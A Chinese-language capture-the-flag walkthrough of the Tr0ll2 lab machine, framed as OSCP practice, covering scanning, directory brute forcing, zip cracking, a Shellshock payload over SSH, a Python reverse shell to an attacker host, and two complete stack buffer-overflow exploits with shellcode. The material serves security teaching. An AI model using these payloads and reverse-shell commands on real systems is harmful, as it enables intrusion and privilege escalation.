## 简介

该项目是Maleus作者精心制作的项目环境，该项目环境较为困难，但解决所需的时间大致相同，而且毫无疑问，巨魔仍然存在。目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该文章都能学习到一些红队的技巧和知识。

该项目有始有终会用到信息收集->各类服务端口信息枚举->目录爆破枚举->web信息收集+base64解码->zip暴力破解->ssh登录信息枚举->内网信息枚举->缓冲区溢出（两种提权方法），最终拿到flag.txt的过程，那么在八大模块中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

 **请注意：**

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

## 一、信息收集

信息收集非常重要，有了信息才能知道下一步该如何进行，接下来将用nmap来演示信息收集：

### 1、nmap扫描存活IP

由于本项目环境是nat模式需要项目IP地址，扫描挖掘本地的IP地址信息：  
![1651646049_62721e6123e3e11d121dd.png!small?1651646049427](https://image.3001.net/images/20220504/1651646049_62721e6123e3e11d121dd.png!small?1651646049427)  
发现本kali ip为4段！用4段进行全网段扫描：

    
    
    nmap -sP 192.168.4.0/24
    

![1651646074_62721e7ad9305d9ed3406.png!small?1651646075315](https://image.3001.net/images/20220504/1651646074_62721e7ad9305d9ed3406.png!small?1651646075315)

发现项目IP为192.168.4.177。

### 2、nmap全端口服务枚举

进行namp全端口服务枚举：

    
    
    nmap -sS -sV -A -T5 192.168.4.177
    

![1651646080_62721e80b18230bb4ea64.png!small?1651646081948](https://image.3001.net/images/20220504/1651646080_62721e80b18230bb4ea64.png!small?1651646081948)

得到开放的端口信息：21 ftp 、22 ssh 、80 http。

## 二、端口信息枚举

### 1、web端口信息枚举

访问web页面并查看其源码信息：

    
    
    http://192.168.4.177/
    

![1651646085_62721e8576147b4f61f60.png!small?1651646085855](https://image.3001.net/images/20220504/1651646085_62721e8576147b4f61f60.png!small?1651646085855)

主页仅仅提供一张图片，图片中隐写查看也没有可利用信息，查看静态源码发现：

    
    
    <!--Nothing here, Try Harder!><!--Author: Tr0ll><!--Editor: VIM>-->
    

源码提示：这里没有什么信息！

### 2、FTP信息枚举

ftp尝试弱口令登录枚举：

    
    
    ftp 192.168.4.177
    Troll           #账户密码
    dir             #查看
    get lmao.zip    #下载压缩包
    

![1651646092_62721e8c581729a823922.png!small?1651646092890](https://image.3001.net/images/20220504/1651646092_62721e8c581729a823922.png!small?1651646092890)

发现 lmao.zip文件，下载后进行解压发现需要密码，无法爆破，找密码。

## 三、目录爆破枚举

### 1、dirb目录爆破

利用dirb下默认的common字典对web目录进行爆破：

    
    
    dirb http://192.168.4.177/
    

![1651646097_62721e91a75db87d083ed.png!small?1651646098349](https://image.3001.net/images/20220504/1651646097_62721e91a75db87d083ed.png!small?1651646098349)  
发现robots.txt文件，深入枚举。

### 2、目录信息枚举

1）访问robots.txt查看，发现目录遍历：

    
    
    http://192.168.4.177/robots.txt
    

![1651646102_62721e969e87e94a81e79.png!small?1651646103083](https://image.3001.net/images/20220504/1651646102_62721e969e87e94a81e79.png!small?1651646103083)

2）将robots.txt下载下来，进行爆破

    
    
    wget http://192.168.4.177/robots.txt
    dirb http://192.168.4.177/ robots.txt  ---空格后填写文本默认指向该字典
    

![1651646107_62721e9bc89d0bfc39132.png!small?1651646108765](https://image.3001.net/images/20220504/1651646107_62721e9bc89d0bfc39132.png!small?1651646108765)  
发现存在目录：http://192.168.4.177/dont_bother/。

3）访问目录，发现图片

    
    
    http://192.168.4.177/dont_bother/
    

![1651646112_62721ea05de04df2c2eb4.png!small?1651646113205](https://image.3001.net/images/20220504/1651646112_62721ea05de04df2c2eb4.png!small?1651646113205)  
主页仅仅提供一张图片，图片中隐写查看也没有可利用信息，查看静态源码发现：  
查看源码提示：

    
    
    <!--What did you really think to find here? Try Harder!><img src='cat_the_troll.jpg'>
    

存在cat_the_troll.jpg图片文件，继续查看！

4）访问cat_the_troll.jpg文件查看

    
    
    http://192.168.4.177/dont_bother/cat_the_troll.jpg
    

![1651646118_62721ea65da574ac94cbc.png!small?1651646119314](https://image.3001.net/images/20220504/1651646118_62721ea65da574ac94cbc.png!small?1651646119314)  
发现还是一样的图片，下载查看信息！

5）用wget下载图片分析

    
    
    wget http://192.168.4.177/dont_bother/cat_the_troll.jpg
    

![1651646123_62721eab98b23dad13596.png!small?1651646124254](https://image.3001.net/images/20220504/1651646123_62721eab98b23dad13596.png!small?1651646124254)  
利用wget命令下载成功。

6）用strings查看图片隐写的信息

    
    
    strings cat_the_troll.jpg
    

![1651646127_62721eaf2305038418234.png!small?1651646127630](https://image.3001.net/images/20220504/1651646127_62721eaf2305038418234.png!small?1651646127630)![1651646131_62721eb398ccee1edbff5.png!small?1651646132032](https://image.3001.net/images/20220504/1651646131_62721eb398ccee1edbff5.png!small?1651646132032)  
告知我们前往y0ur_self寻找线索！

## 四、web信息收集

### 1、web信息深入枚举

访问web页面，信息枚举：

    
    
    http://192.168.4.177/y0ur_self/
    

![1651646136_62721eb8a0b2f8911c4dc.png!small?1651646137135](https://image.3001.net/images/20220504/1651646136_62721eb8a0b2f8911c4dc.png!small?1651646137135)  
发现：http://192.168.4.177/y0ur_self/answer.txt  
接着访问该文件：  
![1651646140_62721ebcbf48545553247.png!small?1651646141123](https://image.3001.net/images/20220504/1651646140_62721ebcbf48545553247.png!small?1651646141123)  
发现全都是base64编码的文本信息，接下来去解码！

### 2、base64解码

wget下载文本并用base64解码：  
![1651646145_62721ec12fff293b648c2.png!small?1651646146345](https://image.3001.net/images/20220504/1651646145_62721ec12fff293b648c2.png!small?1651646146345)

    
    
    wget http://192.168.4.177/y0ur_self/answer.txt   ----下载到本地answer.txt
    base64 -d answer.txt > 1.txt    ---将整个文本base64解码后导出到1.txt
    

发现这类似一个密码本，那么来尝试爆破FTP下载的ZIP文件试试！

## 五、ZIP暴力破解

### 1、fcrackzip暴力破解

ZIP利用密码本对lmao.zip压缩文件进行暴力破解：

    
    
    fcrackzip -u -D -p 1.txt lmao.zip
    [-u|--use-unzip] 使用 unzip 清除错误密码
    [-D|--dictionary] 使用字典
    [-p|--init-password string] 使用字符串作为初始密码/文件
    

![1651646151_62721ec76782875c4649b.png!small?1651646151748](https://image.3001.net/images/20220504/1651646151_62721ec76782875c4649b.png!small?1651646151748)  
找到密码：

    
    
    ItCantReallyBeThisEasyRightLOL
    

解压lmao.zip：

    
    
    unzip lmao.zip
    

![1651646155_62721ecb0745665e2c290.png!small?1651646155228](https://image.3001.net/images/20220504/1651646155_62721ecb0745665e2c290.png!small?1651646155228)  
获得noob文件！

### 2、noob文件信息枚举

    
    
    cat noob
    

![1651646159_62721ecf3738cd66ea310.png!small?1651646160949](https://image.3001.net/images/20220504/1651646159_62721ecf3738cd66ea310.png!small?1651646160949)  
发现这是一个ssh的key文件！

## 六、shellshock漏洞利用

### 1、ssh尝试登录

    
    
    ssh noob@192.168.4.177
    

![1651646164_62721ed4679632236c6d4.png!small?1651646165727](https://image.3001.net/images/20220504/1651646164_62721ed4679632236c6d4.png!small?1651646165727)  
弱口令登录失败，发现noob是普通权限，去赋权。

赋权并尝试ssh登录：

    
    
    chmod 400 noob
    ssh -i noob noob@192.168.4.177
    

![1651646168_62721ed88a9f6b77b9ff1.png!small?1651646168896](https://image.3001.net/images/20220504/1651646168_62721ed88a9f6b77b9ff1.png!small?1651646168896)  
提示链接关闭了，可以登录需要外壳拿权限。

### 2、shellshock env环境变量绕过ssh

Shellshock，又称Bashdoor，是在Unix中广泛使用的Bash
shell中的一个安全漏洞，首次于2014年9月24日公开。shellshock Bash 漏洞利用CVE-2014-6271可以通过 SSH 被利用！

1）谷歌搜索Bash的漏洞利用：  
![1651646173_62721edd358c5ffb07502.png!small?1651646174197](https://image.3001.net/images/20220504/1651646173_62721edd358c5ffb07502.png!small?1651646174197)  
找到以上方法利用。

2）查看当前shell 的设置是否为bash  
利用'() { :;}; cmd' 这个payload让操作系统将) { :;}; 误认为是函数环境变量！

    
    
    ssh -i noob noob@192.168.4.177 '() { :;}; cat /etc/passwd'
    

![1651646177_62721ee11b6a004475699.png!small?1651646177606](https://image.3001.net/images/20220504/1651646177_62721ee11b6a004475699.png!small?1651646177606)  
是bash模式的shell，小伙伴想详细熟悉shellshock的可参考文章：

    
    
    https://zhuanlan.zhihu.com/p/35579956
    

3）bash漏洞利用，反弹shell

    
    
    ssh -i noob noob@192.168.4.177 '() { :;}; /bin/bash'  
    python -c 'import pty; pty.spawn("/bin/bash")'
    

![1651646182_62721ee61f5beec0d89be.png!small?1651646182419](https://image.3001.net/images/20220504/1651646182_62721ee61f5beec0d89be.png!small?1651646182419)  
伪shell不太稳定，需建立稳定shell进行信息收集。

4）建立稳定shell

开启nc服务反弹tty shell：

    
    
    nc -lvp 7777    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.2",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    python -c 'import pty; pty.spawn("/bin/bash")' 
    

![1651646187_62721eeb3edc7fe5076b5.png!small?1651646187919](https://image.3001.net/images/20220504/1651646187_62721eeb3edc7fe5076b5.png!small?1651646187919)  
可看到成功通过python反弹shell获得noob普通用户服务权限！

## 七、内网信息收集

### 1、查找特权用户信息

使用find命令查看特权用户信息：

    
    
    find / -perm -4000 2>/dev/null     ----查找所有目录中文件属性具有读、写权限，查看rwsr的文件！
    

![1651646191_62721eef6168453dca60f.png!small?1651646191839](https://image.3001.net/images/20220504/1651646191_62721eef6168453dca60f.png!small?1651646191839)  
发现含有root的文件目录，继续枚举信息。

### 2、信息枚举

进入目录查看：

    
    
    cd /nothing_to_see_here/choose_wisely/
    ls -lahR
    

![1651646197_62721ef50214c4e19a6e5.png!small?1651646198290](https://image.3001.net/images/20220504/1651646197_62721ef50214c4e19a6e5.png!small?1651646198290)  
发现door2 可能存在缓冲区溢出！进行分析枚举！

## 八、缓冲区溢出（方法一）

缓冲区溢出（buffer
overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。

### 1、判断是否有溢出

1）进入查看溢出文件信息

    
    
    cd door2
    ls
    ./r00t
    

![1651646203_62721efb45dd7c891b50f.png!small?1651646203489](https://image.3001.net/images/20220504/1651646203_62721efb45dd7c891b50f.png!small?1651646203489)  
Usage: ./r00t input，提示在r00t后面添加命令。

2）测试是否存在缓冲区溢出

    
    
    ./r00t $(python -c 'print "A" * 300')   ---生成300个A
    

![1651646208_62721f004c922b21f5ef6.png!small?1651646209529](https://image.3001.net/images/20220504/1651646208_62721f004c922b21f5ef6.png!small?1651646209529)

提示： **Segmentation fault** \----分段错误，存在溢出！接下来将该文件base64转发下载到本地进行逆向分析！

3）base64转码

放入本地分析，将r00t编译为base64：

    
    
    base64 r00t
    

![1651646213_62721f05b897d899ae848.png!small?1651646215389](https://image.3001.net/images/20220504/1651646213_62721f05b897d899ae848.png!small?1651646215389)

将转码值写入本地文本并解码成文件！  
复制至本地文本：

    
    
    gedit base.txt
    

![1651646218_62721f0a38d4de5f5e8c6.png!small?1651646219589](https://image.3001.net/images/20220504/1651646218_62721f0a38d4de5f5e8c6.png!small?1651646219589)

base64解码并验证：

    
    
    cat base.txt | base64 -d > r00t 
    md5sum r00t   ---双方MD5值对比（因MD5不可逆）
    

![1651646224_62721f1083940ec3a5f97.png!small?1651646225221](https://image.3001.net/images/20220504/1651646224_62721f1083940ec3a5f97.png!small?1651646225221)  
文件一致！

### 2、查找偏移量

pattern_create是生成一个字符串模板输入后根据EIP来确定覆盖return addr的长度。

1）利用pattern_create.rb，在本地生成300个字符，找偏移量

    
    
    locate pattern_create.rb
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
    

![1651646228_62721f14715b8d968664e.png!small?1651646228892](https://image.3001.net/images/20220504/1651646228_62721f14715b8d968664e.png!small?1651646228892)

2）GDB分析

gdb是GNU开源组织发布的一个强大的Linux下的程序调试工具，逆向分析有非常多好用的工具，但是GDB毋庸置疑是最强之一，它的pwndbg和peda插件那就是辅助GDB上神器行列的最强帮手。

用gdb进行拆解，找溢出值，填充300的值，获取偏移地址：

    
    
    gdb r00t
    run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
    

![1651646234_62721f1a0fe2d272c124f.png!small?1651646234922](https://image.3001.net/images/20220504/1651646234_62721f1a0fe2d272c124f.png!small?1651646234922)  
获得地址：

    
    
    0x6a413969
    

3）获得偏移量

利用pattern_offset.rb，找偏移量：

    
    
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6a413969
    

获得偏移量为268！

### 3、查找ESP的溢出地址

前面找到偏移量后，可以知道栈空间大小占据空间位置，接下来找到跳板地址也就是ESP，就可以跳到恶意代码shellcode位置！

1）print写入268个A和4个B，查找出EIP地址

    
    
    r $(python -c 'print "A"*268 + "B"*4')
    info r
    

![1651646242_62721f22cd512c1e54c63.png!small?1651646243930](https://image.3001.net/images/20220504/1651646242_62721f22cd512c1e54c63.png!small?1651646243930)  
继续获取ESP值。

2）获取ESP（下一跳值）

print写入268个A、4个B和20个C，查找出ESP地址：

    
    
    r $(python -c 'print "A"*268 + "B"*4 + "C"*20')
    

![1651646247_62721f27a86bed3d59255.png!small?1651646248891](https://image.3001.net/images/20220504/1651646247_62721f27a86bed3d59255.png!small?1651646248891)  
获取ESP内存地址：0xbffffb80  
即反向ESP为：\x80\xfb\xff\xbf。

### 4、shellcode编写

谷歌搜索获得shellcode：

    
    
    http://shell-storm.org/shellcode/files/shellcode-827.php
    

因为它运行在Intel，并且操作系统是86位Linux，因此我从此处获取Shellcode连接：  
![1651646253_62721f2d4a34f5e3dc045.png!small?1651646253636](https://image.3001.net/images/20220504/1651646253_62721f2d4a34f5e3dc045.png!small?1651646253636)

    
    
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
    

当选择好shellcode恶意代码后，即可进行exp写入shellcode进行编写payload。

### 5、EXP编写

接下来需要执行exp，获得shell，开始编写。  
编写EXP：

    
    
    ./r00t $(python -c 'print "A"*偏移量 + "反向ESP" + "\x90"*20 + "shellcode"')
    

按照模板编写：

    
    
    ./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
    python -c 'import pty; pty.spawn("/bin/bash")'  #执行tty
    

![1651646261_62721f356a7dd33b48516.png!small?1651646261873](https://image.3001.net/images/20220504/1651646261_62721f356a7dd33b48516.png!small?1651646261873)  
可看到成功缓冲区溢出跳转执行shellcode获得bash的shell！

## 九、缓冲区溢出（方法二）

通过以上方法一，成功溢出获得反弹shell，方法二会讲述确认坏字符、根据坏字符制定新的shellcode并利用的过程。

### 1、查看是否存在缓冲区溢出

1）判断是否存在缓冲区溢出：

    
    
    ./r00t $(python -c 'print "A" * 300')
    

![1651646265_62721f39eb864650be1e4.png!small?1651646267178](https://image.3001.net/images/20220504/1651646265_62721f39eb864650be1e4.png!small?1651646267178)  
提示分段错误，存在溢出！

### 2、查找偏移量

方法一已经熟知缓冲区溢出覆盖情况，这边直接查找偏移量。

1）gdb分解：

    
    
    gdb r00t
    r $(python -c 'print "A"*268 + "B"*4')
    info r
    

![1651646276_62721f440eee4bbadccb4.png!small?1651646277362](https://image.3001.net/images/20220504/1651646276_62721f440eee4bbadccb4.png!small?1651646277362)

2）获取ESP（下一跳值）：

    
    
    r $(python -c 'print "A"*268 + "B"*4 + "C"*20')
    

![1651646280_62721f48967b26c2c33bf.png!small?1651646281311](https://image.3001.net/images/20220504/1651646280_62721f48967b26c2c33bf.png!small?1651646281311)  
获取ESP内存地址：0xbffffb80  
即反向ESP为：\x80\xfb\xff\xbf。

### 3、确认坏字符

缓冲区溢出的在生成shellcode时，会影响输入的字符，比如’n’字符会终止输入，会截断输入导致我们输入的字符不能完全进入缓冲区，常见的坏字符有x0a、x0b、x00。

现在生成一串与字节数组相同的坏字符。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：

    
    
    #!/usr/bin/env python
    from __future__ import print_function
    
    for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')
    
    print()
    

![1651646286_62721f4e2ef07fcce095a.png!small?1651646286735](https://image.3001.net/images/20220504/1651646286_62721f4e2ef07fcce095a.png!small?1651646286735)

执行py脚本：

    
    
    python 1.py 
    

![1651646290_62721f5244cbcf7e415c3.png!small?1651646291156](https://image.3001.net/images/20220504/1651646290_62721f5244cbcf7e415c3.png!small?1651646291156)  
获得十进制！

执行shellcode：

    
    
    r $(python -c 'print "A"*268 + "B"*4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ')
    

![1651646296_62721f58e05aba245bedf.png!small?1651646298920](https://image.3001.net/images/20220504/1651646296_62721f58e05aba245bedf.png!small?1651646298920)

查找坏字符：

    
    
    x/256x $esp   
    x/256b $esp
    

\---如果出问题就x和b换用  
![1651646301_62721f5d422817bc599ea.png!small?1651646302124](https://image.3001.net/images/20220504/1651646301_62721f5d422817bc599ea.png!small?1651646302124)![1651646305_62721f61cb5166ddadfc1.png!small?1651646306949](https://image.3001.net/images/20220504/1651646305_62721f61cb5166ddadfc1.png!small?1651646306949)

发现在0x08后面不对，怀疑0x08后面的0x00和0x09是个坏字符，至于后面全乱序猜测是因为0x0a换行符的问题。接着把坏字符去掉，在核对下是否无误。

去掉0x09和0x0a：

    
    
    r $(python -c 'print "A"*268 + "B"*4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ')
    

![1651646312_62721f68adbd5cf2631a4.png!small?1651646315229](https://image.3001.net/images/20220504/1651646312_62721f68adbd5cf2631a4.png!small?1651646315229)

接着看下是否还存在坏字符：

    
    
    x/256x $esp   
    x/256b $esp
    

![1651646317_62721f6d4ee05c3450866.png!small?1651646319532](https://image.3001.net/images/20220504/1651646317_62721f6d4ee05c3450866.png!small?1651646319532)

发现从0x20又开始乱了，接着去掉0x20核对下！  
注意：这一定要仔细看，因为看少了看错了都会导致msf的payload执行不成功！

去掉0x09、0x0a和0x20：

    
    
    r $(python -c 'print "A"*268 + "B"*4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ')
    

![1651646323_62721f73496923912bf1e.png!small?1651646325366](https://image.3001.net/images/20220504/1651646323_62721f73496923912bf1e.png!small?1651646325366)

查看是否存在坏字符：

    
    
    x/256b $esp
    

![1651646327_62721f776fe571319ca8d.png!small?1651646328952](https://image.3001.net/images/20220504/1651646327_62721f776fe571319ca8d.png!small?1651646328952)

与py脚本一致，不存在坏字符了。  
坏字符总结为0x09、0x0a、0x20、再加个0x00！（默认排除空字节\x00）

    
    
    \x00 \x0a \x0b \x09  \x20
    

### 4、shellcode编写

利用MSF进行shellcode的编写工作，按照坏字符的剔除后开始。

msf生成payload：

    
    
    msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -fc
    -a  框架选择
    -p 载荷类型
    -b 坏字符
    -e 要使用的编码器
    

![1651646333_62721f7d650d497def20f.png!small?1651646333863](https://image.3001.net/images/20220504/1651646333_62721f7d650d497def20f.png!small?1651646333863)

获得payload：

    
    
    "\xba\x19\xb3\xb8\x79\xdb\xde\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x0b\x31\x55\x15\x83\xed\xfc\x03\x55\x11\xe2\xec\xd9\xb3\x21\x97\x4c\xa2\xb9\x8a\x13\xa3\xdd\xbc\xfc\xc0\x49\x3c\x6b\x08\xe8\x55\x05\xdf\x0f\xf7\x31\xd7\xcf\xf7\xc1\xc7\xad\x9e\xaf\x38\x41\x08\x30\x10\xf6\x41\xd1\x53\x78";
    

### 5、编写EXP

bash执行shell，将palyload添加至python，执行shellcode：

    
    
    ./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 + "\xba\x19\xb3\xb8\x79\xdb\xde\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x0b\x31\x55\x15\x83\xed\xfc\x03\x55\x11\xe2\xec\xd9\xb3\x21\x97\x4c\xa2\xb9\x8a\x13\xa3\xdd\xbc\xfc\xc0\x49\x3c\x6b\x08\xe8\x55\x05\xdf\x0f\xf7\x31\xd7\xcf\xf7\xc1\xc7\xad\x9e\xaf\x38\x41\x08\x30\x10\xf6\x41\xd1\x53\x78"')
    

![1651646341_62721f85916770997a64f.png!small?1651646342543](https://image.3001.net/images/20220504/1651646341_62721f85916770997a64f.png!small?1651646342543)

可看到成功缓冲区溢出跳转执行shellcode获得bash的shell！该方法利用查看栈空间坏字符，并在shellcode编写避开坏字符的碰撞，然后使得shellcode顺利运行，获得flag：

    
    
    a70354f0258dcc00292c72aab3c8b1e4
    

## 十、总结

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到内核提权项目落地，学习到了非常多的技巧，例如nmap信息枚举、FTP信息枚举、dirb目录爆破、base64解码、fcrackzip暴力破解、shellshock
env环境变量绕过ssh、缓冲区溢出提权两种方法、shellcode利用（栈空间坏字符发现编写）、msf生成payload反弹shell等，希望伙伴们能实际操作复现一遍！来巩固自身的渗透技术和技巧！

希望大家提高安全意识，没有网络安全就没有国家安全！

作者：十七

